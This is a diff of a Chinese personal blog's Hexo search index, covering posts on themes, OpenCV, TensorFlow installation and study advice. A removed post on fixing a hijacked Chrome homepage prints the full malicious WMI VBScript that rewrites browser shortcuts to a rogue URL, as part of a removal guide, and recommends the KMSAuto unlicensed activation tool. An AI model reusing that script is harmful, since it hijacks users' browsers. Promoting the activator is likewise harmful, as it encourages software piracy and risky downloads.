@@ -1,93 +1,422 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
-  <entry>
-    <title><![CDATA[主题更换纪]]></title>
-    <url>%2F2018%2F12%2F29%2F%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%8D%A2%E7%BA%AA%2F</url>
-    <content type="text"><![CDATA[主题更换纪原本使用的 Material Theme 这两日使用起来很不舒服，页面滚动起来竟然会有些掉帧。于是就想着换个主题用用。由于心水 NexT 已久，所以就着手更换了。 参考主题文档。 安装并启用 NexT下载主题12cd bolggit clone https://github.com/iissnan/hexo-theme-next themes/next 启用主题打开站点根目录下 _config.yml 配置文件，编辑： 1theme: next 此时网站语言可能是英文，因为旧的主题语言设置可能与此主题不同，所以设置： 1language: zh-Hans 接着就看一下我们的新主题： 123hexo cleanhexo generatehexo server 根据提示在浏览器打开 http://localhost:4000 即可见到新主题芳容。 但总感觉哪里有些不对劲，所以需要继续进行配置。 主题设置选择 Scheme打开主题目录下 _config.yml 配置文件，更改： 1scheme: Pisces 这个是双栏模式，个人比较喜欢，其他可以查看文首链接。 菜单menu 下有多项设置可选，看需求设置就好。 如需自定页面，还需按需添加翻译信息（文件位置 languages/{language}.yml） 以上设置完成差不多就可以 deploy 了，其他细节慢慢添加。]]></content>
-      <categories>
-        <category>闲杂</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Ubuntu 下安装 opencv-contrib 做 SIFT 特征匹配(Python)]]></title>
-    <url>%2F2018%2F06%2F05%2FUbuntu-%E4%B8%8B%E5%AE%89%E8%A3%85-opencv-contrib-%E5%81%9A-SIFT-%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D-Python%2F</url>
-    <content type="text"><![CDATA[Ubuntu 下安装 opencv-contrib 做 SIFT 特征匹配(Python)因为 SIFT 算法的授权问题，导致 OpenCV 有两个版本，即如需使用 SIFT 算法就必须要用 OpenCV-contrib ，但是 VS2017 里配置 OpenCV-contrib 比较繁琐，在 Linux 下就会方便很多。 本文所使用环境： Ubuntu 16.04 LTS Python 2.7 安装 opencv-contrib 先安装 pip 软件包管理系统 打开一个 Terminal (快捷键 ctrl + alt + t ) 输入以下命令后回车，按提示操作 sudo apt-get install python-pip 安装 OpenCV-contrib Terminal 中输入以下命令，等待提示完成即可 pip install opencv-contrib-python 验证 Terminal 中执行以下命令验证是否安装成功 $ python import cv2 as cv print(cv.__version__) 安装成功会输出当前版本号 SIFT 特征匹配 代码 #sift feature import cv2 import numpy as np MIN_MATCH_COUNT = 4 imgname1 = &quot;1.jpg&quot; imgname2 = &quot;2.jpg&quot; ## (1) prepare data img1 = cv2.imread(imgname1) img2 = cv2.imread(imgname2) gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY) gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY) ## (2) Create SIFT object sift = cv2.xfeatures2d.SIFT_create() ## (3) Create flann matcher matcher = cv2.FlannBasedMatcher(dict(algorithm = 1, trees = 5), {}) ## (4) Detect keypoints and compute keypointer descriptors kpts1, descs1 = sift.detectAndCompute(gray1,None) kpts2, descs2 = sift.detectAndCompute(gray2,None) ## (5) knnMatch to get Top2 matches = matcher.knnMatch(descs1, descs2, 2) # Sort by their distance. matches = sorted(matches, key = lambda x:x[0].distance) ## (6) Ratio test, to get good matches. good = [m1 for (m1, m2) in matches if m1.distance &amp;lt; 0.7 * m2.distance] canvas = img2.copy() ## (7) find homography matrix if len(good)&amp;gt;MIN_MATCH_COUNT: ## (queryIndex for the small object, trainIndex for the scene ) src_pts = np.float32([ kpts1[m.queryIdx].pt for m in good ]).reshape(-1,1,2) dst_pts = np.float32([ kpts2[m.trainIdx].pt for m in good ]).reshape(-1,1,2) ## find homography matrix in cv2.RANSAC using good match points M, mask = cv2.findHomography(src_pts, dst_pts, cv2.RANSAC,5.0) #matchesMask2 = mask.ravel().tolist() h,w = img1.shape[:2] pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2) dst = cv2.perspectiveTransform(pts,M) cv2.polylines(canvas,[np.int32(dst)],True,(0,255,0),3, cv2.LINE_AA) else: print( &quot;Not enough matches are found - {}/{}&quot;.format(len(good),MIN_MATCH_COUNT)) ## (8) drawMatches matched = cv2.drawMatches(img1,kpts1,canvas,kpts2,good,None)#,**draw_params) ## (9) Crop the matched region from scene h,w = img1.shape[:2] pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2) dst = cv2.perspectiveTransform(pts,M) perspectiveM = cv2.getPerspectiveTransform(np.float32(dst),pts) found = cv2.warpPerspective(img2,perspectiveM,(w,h)) ## (10) save and display cv2.imwrite(&quot;matched.png&quot;, matched) cv2.imwrite(&quot;found.png&quot;, found) cv2.imshow(&quot;matched&quot;, matched); #cv2.imshow(&quot;found&quot;, found); cv2.waitKey();cv2.destroyAllWindows() 原始图像： 匹配结果：]]></content>
-      <categories>
-        <category>OpenCV</category>
-      </categories>
-      <tags>
-        <tag>OpenCV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[OpenCV 在 Visual Studio 中的使用]]></title>
-    <url>%2F2018%2F04%2F28%2FOpenCV-%E5%9C%A8-Visual-Studio-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
-    <content type="text"><![CDATA[OpenCV 在 Visual Studio 2017 中的使用因为 nonfree 的算法问题，重写部分内容，文中图片暂不更换，文件名及路径以文字为准。 PS: 文中理论上没有错误的地方了=￣ω￣= 因为某些原因，阅读体验较差 本文内容： OpenCV 的安装 Visual Studio 的安装 VS 中配置 OpenCV 所需环境及文件（仅供参考）： Windows 10 64 bit opencv-2.4.13.6-vc14.exe Visual Studio 2017 推荐使用 OpenCV-2.* 是因为可以更方便使用如 SIFT 等 nonfree 算法 OpenCV 的安装 下载在 OpenCV 的 GitHub 的 Releases 页面下载 opencv-2.4.13.6-vc14.exe 文件 （OpenCV 此页面也可下载到） 安装上述下载的文件为自解压文件，双击后选择要解压的目录即可（本文直接解压到 C 盘，后续用到的路径根据自己解压的路径自行替换） 添加环境变量右键此电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量编辑系统变量的 Path 变量，添加 C:\opencv\build\x64\vc14\bin 此路径 Visual Studio 的安装 下载进入官方下载页面下载 Visual Studio Community 2017 版本 （确保你有微软账号，软件需要登陆，不登陆可能会有使用时间限制） 安装打开刚下载的软件，等待些许时间会进入 Visual Studio Installer , 选择 Visual Studio Community 2017 安装，接下来我们选择要安装的环境（本文选择 c++ ）如下图 (此处需要注意，C 盘务必保留充足空间，即使更换了安装位置还是要占用 C 盘部分空间) 接下来等待安装程序自动下载安装，时间长短依赖个人网速及电脑性能 VS 中配置 OpenCV大致需要三个步骤： 编译器添加 include 路径 编译器添加 lib 路径 编译器添加 lib 文件 新建一个空/控制台项目 添加一个源文件 配置 OpenCV 并运行测试代码 配置 红框处按图片上设置然后在新建的项目上右键然后选择属性 添加 C:\opencv\build\include 路径，注意红框处 添加 C:\opencv\build\x64\vc14\lib 路径 添加 opencv_ml2413d.libopencv_calib3d2413d.libopencv_contrib2413d.libopencv_core2413d.libopencv_features2d2413d.libopencv_flann2413d.libopencv_gpu2413d.libopencv_highgui2413d.libopencv_imgproc2413d.libopencv_legacy2413d.libopencv_objdetect2413d.libopencv_ts2413d.libopencv_video2413d.libopencv_nonfree2413d.libopencv_ocl2413d.libopencv_photo2413d.libopencv_stitching2413d.libopencv_superres2413d.libopencv_videostab2413d.lib这些库文件，Release mod 删除后缀前的 d 即可，其他版本根据具体版本修改每个文件中的数字（即版本号） 测试代码 将代码 copy 到刚刚新建的源文件并保存 /********************************************************** Name : Date : 2016/05/29 By : CharlotteHonG Final: 2016/05/29 **********************************************************/ #include &amp;lt;iostream&amp;gt; #include &amp;lt;opencv2/opencv.hpp&amp;gt; using namespace cv; int main(int argc, char const *argv[]) { /* 畫布 */ Mat img(270, 720, CV_8UC3, Scalar(56, 50, 38)); /* 直線 */ line(img, Point(20, 40), Point(120, 140), Scalar(255, 0, 0), 3); /* 實心方塊 */ rectangle(img, Point(150, 40), Point(250, 140), Scalar(0, 0, 255), -1); /* 實心圓 */ circle(img, Point(330, 90), 50, Scalar(0, 255, 0), -1); /* 空心橢圓 */ ellipse(img, Point(460, 90), Size(60, 40), 45, 0, 360, Scalar(255, 255, 0), 2); /* 不規則圖形 */ Point points[1][5]; int x = 40, y = 540; points[0][0] = Point(0 + y, 50 + x); points[0][1] = Point(40 + y, 0 + x); points[0][2] = Point(110 + y, 35 + x); points[0][3] = Point(74 + y, 76 + x); points[0][4] = Point(28 + y, 96 + x); const Point* ppt[1] = { points[0] }; int npt[] = { 5 }; polylines(img, ppt, npt, 1, 1, Scalar(0, 255, 255), 3); /* 繪出文字 */ putText(img, &quot;Test Passed !!&quot;, Point(10, 230), 0, 3, Scalar(255, 170, 130), 3); /* 開啟畫布 */ namedWindow(&quot;OpenCV Test By:Charlotte.HonG&quot;, WINDOW_AUTOSIZE); imshow(&quot;OpenCV Test By:Charlotte.HonG&quot;, img); waitKey(0); return 0; } 一切准备好了，现在，直接按 F5 运行即可。不出意外，你会看到下图，如果出现问题，请检查以上步骤。 关于 SIFT 算法的程序问题，新建项目时推荐新建 Windows控制台应用程序 ，网上的程序可能会因为配置的 OpenCV 的路径不同，无法在你的电脑上运行（即找不到头文件），所以如果你使用本文的方法配置环境，对于 OpenCV 的扩展头文件应使用如下形式： #include &quot;opencv2/highgui/highgui.hpp&quot; ps: 此方法在每次新建项目后都要重新配置，貌似是 vs2017 无法全局配置，可以尝试将配置导出，以后直接导入配置，应该会方便些，具体方法这里就不说了（或者其他的配置方式）。 本文部分内容及代码借鉴自此博主 Charlotte.HonG 的文章 [圖文] OpenCV 3.4.1 安裝配置在 Visual Studio 2017 （感谢 Charlotte.HonG ^_^）]]></content>
-      <categories>
-        <category>OpenCV</category>
-      </categories>
-      <tags>
-        <tag>OpenCV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[在 Ubuntu 中安装 TensorFlow]]></title>
-    <url>%2F2018%2F04%2F10%2F%E5%9C%A8-Ubuntu-%E4%B8%AD%E5%AE%89%E8%A3%85-TensorFlow-1%2F</url>
-    <content type="text"><![CDATA[在 Ubuntu 中安装 TensorFlow本文将介绍如何安装允许您使用 Python 编写应用程序的 TensorFlow 版本，理论适用于其他 Linux 发行版，请自测。为方便，本文仅介绍仅支持 CPU 的 TensorFlow ，如有需要 GPU 支持的版本，访问如下链接：install TensorFlow 本文所使用环境：64-bit Ubuntu 16.04 安装 TensorFlow 的几中方法 Virtualenv native pip Docker Anaconda 源代码方式 推荐使用 Virtualenv 方式安装 Virtualenv按照以下步骤使用 Virtualenv 安装 TensorFlow 通过以下两个命令之一安装 pip 和 Virtualenv $ sudo apt-get install python-pip python-dev python-virtualenv # for Python 2.7 $ sudo apt-get install python3-pip python3-dev python-virtualenv # for Python 3.n 通过以下两条命令之一创建 Virtualenv 环境​ $ virtualenv –system-site-packages targetDirectory # for Python 2.7​ $ virtualenv –system-site-packages -p python3 targetDirectory # for Python 3.n 建议将 targetDirectory 设置为 ~/tensorflow3. 通过以下两条命令之一激活 Virtualenv 环境​ $ source ~/tensorflow/bin/activate # bash, sh, ksh, or zsh​ $ source ~/tensorflow/bin/activate.csh # csh or tcsh 成功后命令行提示语将变为如下所示：​ (tensorflow)$ 确保已安装 &gt;=8.1 版本的 pip​ (tensorflow)$ easy_install -U pip 通过以下命令之一将 TenorFlow 安装在已激活的 Virtualenv 环境中​ (tensorflow)$ pip install –upgrade tensorflow # for Python 2.7​ (tensorflow)$ pip3 install –upgrade tensorflow # for Python 3.n(tensorflow)$ pip install --upgrade tensorflow-gpu # for Python 2.7 and GPU (tensorflow)$ pip3 install --upgrade tensorflow-gpu # for Python 3.n and GPU 如果没有意外（报错），你已经成功了，那么进行下一步。（ps: 这里将解决意外情况的步骤省略掉了，后面有时间会再加上） 注意： 每次使用 TensorFlow 前必须先激活 Virtualenv 环境（如下命令之一）​ $ source ~/tensorflow/bin/activate # bash, sh, ksh, or zsh​ $ source ~/tensorflow/bin/activate.csh # csh or tcsh 用如下命令关闭运行环境​ (tensorflow)$ deactivate 验证安装 准备好你的运行环境 运行一个简单的 TensorFlow 程序​ (tensorflow)$ python 然后依次输入下面几行代码​ import tensorflow as tf​ hello = tf.constant(‘Hello TensorFlow!’)​ sess = tf.Session()​ print(sess.run(hello)） 不出意外，你的终端将输出如下字符串​ Hello, TensorFlow! (错误解决办法本文暂未贴出，后期可能会添加) 卸载 TensorFlow只需将最初创建的 targetDirectory 删除即可 $ rm -r targetDirectory]]></content>
-      <categories>
-        <category>OpenCV</category>
-      </categories>
-      <tags>
-        <tag>OpenCV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Chrome主页被篡改后如何解决？(部分内容转载)]]></title>
-    <url>%2F2018%2F01%2F22%2FChrome%E4%B8%BB%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%90%8E%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F%2F</url>
-    <content type="text"><![CDATA[不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。 篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。 以下为原文： 最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是http://hao.qquu8.com这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。 我们先来看看问题在哪。右键快捷方式查看属性： 哦，原来快捷方式被改了，后面加了一段url。把它删了试试？还是不行，几分钟后还是被改回来了。我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：WMI工具。之后打开WMI Event Viewer： 点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目： 在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性： 在Script Text那一栏我们可以看到这段脚本：On Error Resume Next Const link = “http://hao.qquu8.com/?m=yx&amp;amp;r=j“Const link360 = “http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3“browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”browsersArr = split(browsers,”,”)Set oDic = CreateObject(“scripting.dictionary”)For Each browser In browsersArr​ oDic.Add LCase(browser), browserNextlnkpathsArr = split(lnkpaths,”,”)Set oFolders = CreateObject(“scripting.dictionary”)For Each lnkpath In lnkpathsArr​ oFolders.Add lnkpath, lnkpathNextSet fso = CreateObject(“Scripting.Filesystemobject”)Set WshShell = CreateObject(“Wscript.Shell”)For Each oFolder In oFolders​ If fso.FolderExists(oFolder) Then​ For Each file In fso.GetFolder(oFolder).Files​ If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then​ Set oShellLink = WshShell.CreateShortcut(file.Path)​ path = oShellLink.TargetPath​ name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)​ If oDic.Exists(LCase(name)) Then​ If LCase(name) = LCase(“360se.exe”) Then​ oDicShellLink.Arguments = link360​ Else​ oShellLink.Arguments = link​ End If​ If file.Attributes And 1 Then​ fsoile.Attributes = file.Attributes - 1​ End If​ oShellLink.Save​ End If​ End If​ Next​ End IfNext终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持： 当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款俄罗斯人开发的工具，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：KMSAuto详见抢救被流氓网站劫持的浏览器主页 注： 转载自知乎 原作者： 七个太阳 原文链接： 为什么 Chrome 浏览器的主页会被篡改为 hao123 ？遇到这种情况要如何修复？ 七个太阳的回答 转载以经作者授权，如需二次转载，请务必联系原作者，在此感谢原作者的文章及授权。]]></content>
-      <categories>
-        <category>Tips</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[见字如面第二季第一期]]></title>
-    <url>%2F2017%2F09%2F23%2Fjianzirumian-2-1-1506163849669%2F</url>
-    <content type="text"><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[Ludus]]></title>
-    <url>%2F2017%2F06%2F26%2FLudus%2F</url>
-    <content type="text"><![CDATA[大约一个月前从一个视频中知道了Ludus这个网站，很惊艳，想立即体验一下，无奈没有权限，今天收到Ludus的邮件,给了personal invite code，马上就体验了一波，真的实用又美观。想想当你去做演讲什么的，不用再带着U盘去展示生硬的PPT，而是直接在浏览器中输入链接，就可以将远比PPT美观的作品展示给大家，是不是很高大上啊。 下面是刚刚弄得一个非常简单的作品，大家轻喷。]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[给大学生的几条良心建议（转载）]]></title>
-    <url>%2F2017%2F05%2F19%2F%E7%BB%99%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%87%A0%E6%9D%A1%E8%89%AF%E5%BF%83%E5%BB%BA%E8%AE%AE%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89%2F</url>
-    <content type="text"><![CDATA[原文 by:stormzhang这篇文章是我写给小密圈中 20% 比例的大学生的，但是考虑到我公众号的读者中也有不少也是大学生或者研究生，所以姑且分享出来，希望对更多的还在校园的同学有所帮助与思考，更希望能够消除你们对未来的迷茫与恐慌。 绝大部分的大学教育都是渣 可能有人觉得话说的有点难听，但是事实就是如此，这不是大学的问题，本质上是中国教育的问题，中国的教育一向都是「灌输式」教学，成绩差跟成绩好的同学唯一的区别就是，成绩好的会很努力的去记那些理论性的东西，会非常在意自己的分数与奖项，成绩差的同学则比较懒，但不是笨，甚至很多人比成绩好的同学要聪明，但是本质上，他们都清一色的不知道自己所学的那些东西到底有什么用？这个才是最可悲的地方。 所以，如果你在学校的成绩比较好，那么别骄傲，你只不过会是在毕业后的应聘简历上多一条「大学奖学金获得者」而已，其他没什么特别大的优势，成绩差的也别灰心，你只是比较懒，不愿让自己的付出回报不成正比而已。那些学校好的与学校差的同学，也只是在学历上的一点优势而已，中国绝大部分的学校教育都缺乏讨论、缺乏思考、缺乏实践。 当然，名校肯定比一般的学校要好，这个毋庸置疑，而且平均水平肯定是名校比一般学校出来的人才更多，但是也只是平均而已，我跟比尔盖茨平均起来，我也是亿万富翁了，根本还是取决于个人。 你现在的专业跟你以后的工作可能没什么关系 很多毕业生毕业总是奢求能找到一份专业对口的工作，我告诉你，这很难，本质上也是因为中国的教育造成的，前面说到，你在学校学到的东西根本不知道以后干嘛用的。 拿计算机专业的举例，正是因为计算机专业的同学大学学了一堆什么计算机网络、操作系统，C 语言、数据结构等等，都是最最枯燥、最最乏味的课程，你学了四年，你从来不知道这些东西能做什么用？导致很多计算机专业的同学对自己的课程很厌恶，甚至到了抵触的心理，这也直接造成很多计算机专业的同学毕业后有很多去做了销售，等你工作后才发现，反而工作中从事编程行业的，却很多不是计算机专业的，有很多都是其他理科类专业的同学，而且这部分人大部分是因为毕业后工作接触到了编程，对此产生兴趣，知道这个能赚钱，所以发奋自学，从而走上了这一行。 所以，不管你是什么专业的，如果对本专业感兴趣，那还好，毕业之后尽量去找个专业相关的工作，如果对本专业不感兴趣，想从事别的行业，别担心，只要你感兴趣，肯用心去学习，那么一定不是问题，有时候甚至比那些科班生出身更有优势，因为这个职业是你自己出于兴趣以及回报而选择的，没有任何人逼你，你会更有动力去学习。 「学习能力」是大学四年学到的最重要技能 前面虽然把大学说的一无是处，有人会问，那干脆别读大学好了，这当然是不行的。虽然中国的大学教育有它各种各样的问题，但是这个时代，首先大学文凭是一个硬性规定，没有大学学历，你是很难在社会上立足的，起点会非常难。其次，大学跟高中的形式有着本质的区别，高中的教育是家长和老师的驱动下，面对种种压力你不得不去学习，所以高中的学习是压力下不得不去做的事。 但是大学可就不一样了，没人看着你，没人会关注到你，你有更多的自由与选择空间，玩什么，结实什么样的人，去不去上课都完全取决于你，我相信绝大部分大学生的考试复习大都集中在考试前的最后两周，这种学习完全是自我驱动的，所以，大学还是非常有必要上的，而且每个人最主要的区别可能就体现在了「学习能力」上，因为你会发现，大家都是上着同样的课，甚至有的人根本不去听课，但是同样是最后两周的自学冲刺，有的人就能轻松考过，或者考了很高的分数，有的人却学了很久依然考的不理想，这就是学习能力的差异。 即使是玩游戏，同样的时间，有的人玩的很好，会分析怎么出装更合理，团队战术怎么更容易取胜，有的人，却是一直沉迷于游戏，自制力很弱，而且还很有可能玩的不行。 所以，自制力很好，学习能力很不错的人，会在以后的职场有更多、更好的选择，而且也容易有更好的发展，即使这个人在大学喜欢玩游戏，即使在大学成绩很一般。 多动手，多实习 前面说了，大学学的都是一些理论性的东西，你根本不知道那些东西能干嘛，但是如果你能尽早去实习，尽早去参与实践，那你会有别样的体会。 举个例子，当计算机专业的同学都不知道所学的理论能干嘛的时候，你就去一家企业实习了，即使平时的工作只是打杂，但是你能真正认识了实际工作中是怎样的，别人在工作的时候用到了什么技能，看到别人拿到的高薪，你会发现原来，你所学的那些东西这么值钱，你会更有动力去学习，而且很有针对性的去学习，你得相信，理论与实践相结合，比那些只会闷头读书的人要有用的多，你想要的不是只在学校里空虚的考试分数而已，你更想要的是未来用自己的技能换取财富的能力！ 这些事情你该在大学就做了 我以一个过来人的经验，真心建议你们，大学这些事必须要做了，甚至比拿什么奖学金，考什么证还要重要。 多运动，坚持运动，有个好的身体比什么都重要。 多阅读，坚持阅读，哪怕跟你的专业无关的书籍。 考个驾照，一定要考，这个是 100% 所有工作之后的人最后悔的一件事，是的，就是 100%。 如果可以的话，谈场恋爱吧，哪怕最后以失败告终。 PS：以上就是我过来人的经验之谈，希望可以对更多的人有帮助，觉得有用，可以随手转发，谢谢。]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[Google I/O 17]]></title>
-    <url>%2F2017%2F05%2F10%2FGoogle-I-O-17-1%2F</url>
-    <content type="text"><![CDATA[Google I/O 17—May 17-19, 2017 Google I/O is an annual developer festival held at the outdoor Shoreline Amphitheatre.May 17-19, 2017Shoreline Amphitheatre Mountain View, California ​ 官方网站：Google I/O17]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[修复Ubuntu17.04无法安装网易云音乐问题（转载）]]></title>
-    <url>%2F2017%2F04%2F17%2F%E4%BF%AE%E5%A4%8DUbuntu17.04%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%97%AE%E9%A2%98%2F</url>
-    <content type="text"><![CDATA[装了Ubuntu17.04的用户会出现这一问题，原因是libqt5libqgtk2的依赖问题，这里需要将其替换为qt5-style-plugins.教程如下（以下内容来自互联网）： 1.下载deb包，备用 网易云音乐 2.安装一些编译时需要的程序 sudo apt-get install build-essential debhelper make autoconf automake dpkg-dev fakeroot pbuilder gnupg 3.解包 建立目录sudo mkdir -p netease/DEBIAN sudo mkdir fix 解包sudo dpkg -x netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb ./netease 解出控制文件sudo dpkg -e netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb netease/DEBIAN/ 修改控制文件sudo gedit netease/DEBIAN/control 找到 libqt5libqgtk2 ，替换为 qt5-style-plugins ，保存，退出。 4.重新打包 sudo dpkg-deb -b netease/fix/ 5.安装 sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb 6.至此，理论上不会出错。 （如若报错尝试命令sudo apt-get install -f） PS:修改过的包 网易云音乐fixed 密钥：!aTE_wj3jalmc7Gu5rxhgM3WpLtGzv6ymBrbgJCpDEIg]]></content>
-      <categories>
-        <category>Tips</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Linux-deepin 体验两三事]]></title>
-    <url>%2F2017%2F04%2F14%2FLinux-deepin-%E4%BD%93%E9%AA%8C%E4%B8%A4%E4%B8%89%E4%BA%8B%2F</url>
-    <content type="text"><![CDATA[Windows creator update 貌似把deepin搞坏了，可以引导但无法启动，又突然发现ubunut17.04发布，于是乎重新装上了ubunut，so，此文暂且搁置（估计直接弃坑了），逃。]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[Hello World]]></title>
-    <url>%2F2017%2F02%2F17%2FHello-World%2F</url>
-    <content type="text"><![CDATA[]]></content>
-      <categories>
-        <category>HelloWorld</category>
-      </categories>
-  </entry>
+  
+  
+    
+    <entry>
+      <title><![CDATA[主题更换纪]]></title>
+      <url>http://yoursite.com/2018/12/29/%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%8D%A2%E7%BA%AA/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="主题更换纪"><a href="#主题更换纪" class="headerlink" title="主题更换纪"></a>主题更换纪</h1><p>原本使用的 <a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">Material Theme</a> 这两日使用起来很不舒服，页面滚动起来竟然会有些掉帧。于是就想着换个主题用用。由于心水 <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">NexT</a> 已久，所以就着手更换了。</p>
+<p>参考<a href="git clone https://github.com/iissnan/hexo-theme-next themes/next">主题文档</a>。</p>
+<h2 id="安装并启用-NexT"><a href="#安装并启用-NexT" class="headerlink" title="安装并启用 NexT"></a>安装并启用 NexT</h2><h3 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd bolg</div><div class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</div></pre></td></tr></table></figure>
+<h3 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h3><p>打开站点根目录下 <code>_config.yml</code> 配置文件，编辑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">theme: next</div></pre></td></tr></table></figure>
+<p>此时网站语言可能是英文，因为旧的主题语言设置可能与此主题不同，所以设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">language: zh-Hans</div></pre></td></tr></table></figure>
+<p>接着就看一下我们的新主题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean</div><div class="line">hexo generate</div><div class="line">hexo server</div></pre></td></tr></table></figure>
+<p>根据提示在浏览器打开 <code>http://localhost:4000</code> 即可见到新主题芳容。</p>
+<p>但总感觉哪里有些不对劲，所以需要继续进行配置。</p>
+<h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><h3 id="选择-Scheme"><a href="#选择-Scheme" class="headerlink" title="选择 Scheme"></a>选择 Scheme</h3><p>打开主题目录下 <code>_config.yml</code> 配置文件，更改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scheme: Pisces</div></pre></td></tr></table></figure>
+<p>这个是双栏模式，个人比较喜欢，其他可以查看文首链接。</p>
